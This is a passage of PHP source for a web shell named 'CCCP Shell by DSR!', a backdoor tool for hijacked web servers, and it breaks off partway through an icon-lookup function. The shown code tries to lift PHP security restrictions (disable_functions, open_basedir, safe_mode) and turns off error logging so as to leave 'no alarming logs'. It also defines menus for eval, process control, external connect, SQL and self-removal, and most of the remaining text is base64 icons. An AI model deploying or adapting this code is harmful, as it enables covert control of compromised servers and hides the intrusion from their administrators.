<?php
/*
 * CCCP Shell by DSR!
 * Version: 1.0 Build: 05062012
 */

$tiempoCarga = microtime(true);
//define('IS_WIN', DIRECTORY_SEPARATOR === '\\');
$isWIN = strtolower(substr(PHP_OS, 0, 3)) === 'win';
$isCOM = (class_exists('COM') ? 1 : 0);
// http://virtualdag.org/2009/12/17/php_beautifier-formateador-de-codigo/

# Restoring
ini_restore('safe_mode_include_dir');
ini_restore('safe_mode_exec_dir');
ini_restore('disable_functions');
ini_restore('allow_url_fopen');
ini_restore('safe_mode');
ini_restore('open_basedir');

# Extras 
if (function_exists('ini_set')) {
    @ini_set('error_log', null); // No alarming logs
    @ini_set('log_errors', 0);   // No logging of errors
    @ini_set('file_uploads', 1); // Enable file uploads
    @ini_set('allow_url_fopen', 1); // allow url fopen
} else { //Alias of ini_set()
    @ini_alter('error_log', null);
    @ini_alter('log_errors', 0);
    @ini_alter('file_uploads', 1);
    @ini_alter('allow_url_fopen', 1);
}

error_reporting(7);
ini_set('memory_limit', '64M'); //for online zip usage
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
//@ini_set('output_buffering', 0);

function s_array(&$array) {
	if (is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if (is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}

foreach($_POST as $key => $value) {
	if (get_magic_quotes_gpc()) {
		$value = s_array($value);
	}
	$key = $value;
}

# System variables
$Config['Menu'] = 'menu';
$Config['Action'] = 'act';
$Config['Mode'] = 'mode';
$Config['zAuthType'] = 'basic'; //type of validation
$Config['zName'] = ''; //echo md5('user') . '<br>';
$Config['zPass'] = ''; //echo md5('pass');
$Config['hexdump_lines'] = 16; //lines in hex preview file
$Config['hexdump_rows'] = 32; //16, 24 or 32 bytes in one line
if (@! $_POST[$Config['Menu']]) $_POST[$Config['Menu']] = 'file'; //default action

$Content = '';
$Javascript = '';

# Language
$Lang['fm'] = 'File Manager';
$Lang['tools'] = 'Tools';
$Lang['procs'] = 'Procs';
$Lang['info'] = 'Info';
$Lang['ec'] = 'External Connect';
$Lang['sql'] = 'SQL';
$Lang['eval'] = 'Eval code';
$Lang['update'] = 'Update';
$Lang['sr'] = 'Self remove';
$Lang['out'] = 'Logout';
//fm
$Lang['of'] = 'of';
$Lang['freespace'] = 'Free space';
$Lang['acdir'] = 'Current directory';
$Lang['dd'] = 'Detected drives';
$Lang['webroot'] = 'WebRoot';
$Lang['vwdir'] = 'View Writable Directories';
$Lang['vwfils'] = 'View Writable Files';
$Lang['cdir'] = 'Create directory';
$Lang['cfil'] = 'Create file';
$Lang['writable'] = 'Writable';
$Lang['name'] = 'Name';
$Lang['date'] = 'Date';
$Lang['size'] = 'Size';
$Lang['action'] = 'Action';
$Lang['selected'] = 'Selected';
$Lang['download'] = 'Download';
$Lang['del'] = 'Delete';
$Lang['copy'] = 'Copy';
$Lang['dirs'] = 'Directories';
$Lang['fils'] = 'Files';
//misc
$Lang['yes'] = 'Yes';
$Lang['no'] = 'No';
$Lang['merror'] = 'Are you sure?';


# Images - http://www.famfamfam.com + http://www.base64-image.de
$Img['info'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAPcAAPb4+6fB48DY98fW6+ju9vX4/DdppTprpzpspzxtqD9wqkBwq0Z1rk58s1eDuFuHu2GMv2OLu2OKuWqSw2yVxWWKtneg0HiezISn04+w2ZGz25m54J++46PB5p6736zI65y107PO77nT87jS8qa92b7X9r3W9bzV9KrA2rrO5rnM5MLU6sXW6s3c78nY6tbk9dzp+d3o9tzn9drl89nk8trl8t/q9+Pr9ezx91+Jt2SPvmKMumaQv2WPvmKKuGyYx2GHsmOJtXGdzHKezWuUwG2VwmeOuHWgz3GZx22VwH6o1X6m0Yas14mu2IChxYany5W12Zy73ZSwz6O7167I5LTL5LrN47rM4MPV6sbY7MDR5NTj9NDe7tXi8dnl89bi8N3p9uPs9meTwWmWxGmVw2iUwmyax2qXxGuYxWuYxHGbxXun0nql0Xukz4Gs14Go0YWmyZG01pq73KG92bbM4r/T57vO4r/S5b7Q48TV58jY6NLg7tPh79nm8+Hq8+rw9u7z+PL2+vX4+2uZxb/T5cra6eLs9czc6tXj79Hg7P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAIoALAAAAAAQABAAQAjEABUJHEiwoMAMNNgMOjMmkJ8iPXQkQQRhYAgwWdzICWOIypoUXTQUfJDnDhwjFZxcwbPAoCITMGLMmCHjxYeCHbx4ODLkRpU6AAilibPnwkAVLJDw4IHjT44cQeyQcKlIQYIDBqgSFFDihAitI2xwCdCESZQBfTgU3NJCiQVBBQoIetMGy4qBG2osEWIGDR1ABOaUUfOFgkAMfKD8ICNmaQQJPp4ccjBwggsrRHZIkZIDCAotDAw2mFIoUSI9IBBoXa0oIAA7" />';
$Img['edit'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAPcAACpgtyxity5kuS9lujBlujFmu9Xl/s3S2i1kuS5luTBmujFnuzNpvGWU29fn/jZvvzhxvzt2xNbn/tfo/tbn/djo/vj7//T3+zt2wTx4wT98xUB8xMng+8/j/NHk/NTm/dbo/tXn/dTm/M3W4fP3/PD0+UKAxkKAxUWCxkWCxUeExmCFrbrW9cHb+MLc+MTd+cjg+8nh+8rh+svi+83j/M3j+8/k/M7j+9Dk+9Pn/dPm/EmIxkqIxkmFxEuJxkuIxU2LyEyJxk+MyU+MyE+Lx7jW9MXf+cjh+8fg+sni+8jg+cjV4t7q9uPt9+ry+urx+Ozy+O/0+fT4/PL2+vH1+ff6/UuJxU+NyH2y4tzq9t/s997r9t/r9evz+uzz+evy+O3z+Ozy92e9/Nfm8ujx+PL3+/X5/E+y91Gy91W0+GG8+2K8/GK9/GO9+2S+/GW++2i//W7C/ebw9+30+e70+Pj7/WC+/GWo0pPU/5TV/5XW/5rJ4+30+P3+/sLLttDUvsnNr9XWvf32wv32xP33x/fhWvfiW/XfW/jiXfXcXvXcX/ffY+TJVfbdbPHjr8zGsPLWevDTee3QePHUe+7Tee7Ufe7VgczGs+fLd+3Kbda5drOfcPnjsldCGIJmLqqJQ9W2esWYSee+d7+2ptCdRodhK9ilWNG3kL56GufAi+/SrP/y4Onf0tqYSduZS+ChUdmbUcKMSLyJTNejY8eMSNiaVNOfZsiZZPnJkf/z5aZoJsmFQfnHlNuxhfbTrvDStPzgxP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAMEALAAAAAAQABAAQAj/AIMFAzKk4JArQohYiSCwoQovICZc0iRoEaJIrZY4MSHQB5UOOGzQkPECkCVOqXwBsxUsQ5M4nUrJ2rRHTx48by4sEPhjCpIYSWAYaVHEgh9TvUgJ5BHFAYUQHwJRIqTIEKRXKwSeIGPg06paqELFOsDhSBUMAhk80bKFSZYsXbo4ISGlDwCBPcLQ4QOmL5QwY7A0aBgsCBUaN2rMUOKChSNRv3KpohXMRwkdInJ4qPGn0qBGmWbdErhjToUKEx5hIpSo0CRXrFAITPFFwihQpxgdkgRrRIwyGgRukJPGEy9cu3TdQXPmjJkHAiFwgSPmjRs3bNqosbOmDoKGBAooDBhPYECCBAIEBBAYEAA7" />';
$Img['download'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAPcAAP39/m6K12yN3HCP4W2L2myLzWiL03uc3YWi3Zq27+vx/fn7//v8/vr7/Vd+u2CJyWWNzGiOzWmQzXmf23mc1Ze26pm46qG/77rO7y5fpjNlsT5qq0RwsERtq1F/w1WDxlSBxFN/wViEw1uGx12IyGGLyWGKx12Ev2KLyGWNym6X1HOa1G6TzHGY0Hee2XOZ0Xmg2Xie2Hif2Huh3Hqg2X2j3nyj23Wa0H6l3YGn4oGn4YCm3Xue1IWo3YKk1oyv5KG/6ufw/fD2//r8/zppqnCg4JK15qLH957A77DN87PH47PG3zFbkGqb12+e2HGd0nul2a3P96O61sDa+dDj+9vq/dvq/NPf7uXw/TZkmTlpnlqPy1mFtG2QuIyu1YWkx8Hc+cLc+cXe+cff+crh+s3i+tPm+9Ll+sPU59jp/N/t/eHt++71/TxvpFKGuVaGt7za+b/c+r/c+b/b+MLe+sDa9Mfg+sri+szj+9Dl+tXp/eLv/OTw/PH4//D2/Pf7//f6/fv9//3+//z9/vv8/UuFuaXK67LQ7b3c+b/c+MHZ8NXp+9Pm+Njr/djn9eLw/eTx/erz+06OxEuIvVKUyozA6prG66bL6cbf9cHZ7lWa0Fif1Vuk2m2y5ne36IG86oe43/T5/ff7/l+s4l2o3miw5Nnr+PH4/fn8/vr8/erz8/3///3+/ubw7+bx7+318+Xx7ebx7ejz6un05IS/VIS/UZjJb5nJccfujMfuh9f2otf0ov//3f//4P///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAL8ALAAAAAAQABAAQAj/AH8JHPXJU6dSoxIqFCiwkCgwiUYg8cXCl68/fX6YEKjpkBAyeKiYWZTGyqonmTT90sIFipMmICqoiuWqFaxXFDgI5GTJ154gCticAjTEl6g6nARKcnQGjgoeLXxEkHDjBQqGb1jRiZPCAo4dNmjAkBHjxK8uUpagufIBA69cu3Th6oVgA8NKFi2GimSKEaZLpBhuMhRIT6Mqah5B4uOryAJQAikpWjMljBg7d8rkEbSFEsNJfsYggpDEl5K8voA8EOgGlZw5JC6kYgBgUANCPUL8auMFy5EoJYzk0FFjxgQXKxxk+YLaQwJZtWzdojXrAJFfTLJn1yDCwAABBAIUBOiQISAAOw==" />';
$Img['search'] = '<img src="data:image/gif;base64,R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP///wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOaps5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsDAkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmrCbq7C6sIrqawrKwTv68iyA6rDhEAOw==" />';
$Img['copy'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAMQAAHKQruzx9sfj/uXt9vL2+tXb5MHU4arT+7zd/YmwylVri5XK/IO76EhUaa/S5bPZ/Ha36VRie5/E2Ft6nt/o7ykxQ0FIVz1EVajL332hvNfn8HyjwI7B76HQ+////////yH5BAEAAB8ALAAAAAAQABAAAAWJ4CeOZCkajiMlGQCYoqMNQ0BzE+wMgoCqLBcJQxCkZrVbTiQpcnY9AYLAYShEiSKDGJ0SCNdPVsBo9hCIx4MQEW0CCMYY/TgcCA0RAA6Z1w8dA3kfAAQIEG90gIGDEwUEBntpgAsLFBZ6CgoRhZMdlQEXJo4ENBQUAQYVJgCaEQ0NFhcVbTC2HyEAOw==" />';
$Img['del'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAMQAAOt0dP94eOFjY/a0tP/JyfFfX/yVlf6mppNtbf5qanknJ9dVVeZqat5eXpiMjGo4OIUvL3pGRthWVuhvb1kaGv39/f1lZdg7O/7Y2F8/P+13d4tcXNRTU2dCQv///////yH5BAEAAB8ALAAAAAAQABAAAAVx4CeOZFlGToogkSluGEEcRg2ZsKYBwDQxgduog9HxfAyGIEAZDnge38UjWD6cvolnGqgmrqLOIMngVhuJZngs4Hoa8LSz6gnA32j1p2NY+P8LEhxyIxkaghyJiQkKJoYWBZEFFo0uDxAKmRB6Lp2enyEAOw==" />';
$Img['lnk'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjONSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHziUww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABkAAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDGMymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQADs=" />';
$Img['dir'] = '<img src="data:image/gif;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=" />';
$Img['htaccess'] = '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJAAA7" />';
$Img['asp'] = '<img src="data:image/gif;base64,R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD//////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgID6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=" />';
$Img['cgi'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/SEv/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQXv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UMBagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKDAkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAiRYtMAgEAOw==" />';
$Img['php'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlgt0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==" />';
$Img['html'] = '<img src="data:image/gif;base64,R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNzc////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3PKIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDkBkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIRADs=" />';
$Img['jpg'] = '<img src="data:image/gif;base64,R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEciCi8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftdFxEAOw==" />';
$Img['js'] = '<img src="data:image/gif;base64,R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibHk0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhsa00AjYYBbc/o9HjNniUAADs=" />';
$Img['swf'] = '<img src="data:image/gif;base64,R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/OnAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GAGBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgCNysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=" />';
$Img['tar'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JICWv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XFHgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGDUyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17puo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkgGwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMdHUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FBu4tLAgEAOw==" />';
$Img['mp3'] = '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANUaGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fcIGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=" />';
$Img['avi'] = '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANMWFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4PYXCyg+V2i44XeRmSfYqsGhAAgA7" />';
$Img['cmd'] = '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANIeLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCNdmrYAMn1onq/YKpjvEgAADs=" />';
$Img['cpp'] = '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANCWLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4RaEq7YrLDE7a4SADs=" />';
$Img['ini'] = '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANLaArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VMSnEjgPVarHEHgrB43JvszsQEADs= " />';
$Img['doc'] = '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANRWErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmqMIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=" />';
$Img['exe'] = '<img src="data:image/gif;base64,R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqtxhIAOw==" />';
$Img['log'] = '<img src="data:image/gif;base64,R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wNzLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==" />';
$Img['pl'] = '<img src="data:image/gif;base64,R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMoGLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7" />';
$Img['txt'] = '<img src="data:image/gif;base64,R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJSArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7UpPWG3Ig6Hq/XmRjuZwkAAA7" />';
$Img['xml'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACAgDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICxOAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQIQA7" />';
$Img['unk'] = '<img src="data:image/gif;base64,R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1Up9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmPwr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMzaQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpMuSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQCyIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDjyAsokBkQADs=" />';

function showIcon($image) {
    global $Img;
    $image = strtolower(substr(strrchr($image, '.'), 1));

    $imgEquals = array(
      'tar' => array('tar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'zip', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'rar', 'uuf'), 
      'php' => array('php', 'php3', 'php4', 'php5', 'phtml', 'shtml'), 
      'jpg' => array('jpg', 'gif', 'png', 'jpeg', 'jfif', 'jpe', 'bmp', 'ico', 'tif', 'tiff'), 
      'html'=> array('html', 'htm'), 
      'avi' => array('avi', 'mov', 'mvi', 'mpg', 'mpeg', 'wmv', 'rm'), 
      'lnk' => array('lnk', 'url'), 
      'ini' => array('ini', 'css', 'inf'), 
      'doc' => array('doc', 'dot'), 
      'js'  => array('js', 'vbs'), 
      'cmd' => array('cmd', 'bat', 'pif'), 
      'wri' => array('wri', 'rtf'), 
      'swf' => array('swf', 'fla'), 
      'mp3' => array('mp3', 'au', 'midi', 'mid'), 
      'htaccess' => array('htaccess', 'htpasswd', 'ht', 'hta', 'so') 
	);

    foreach ($imgEquals as $k => $v) {
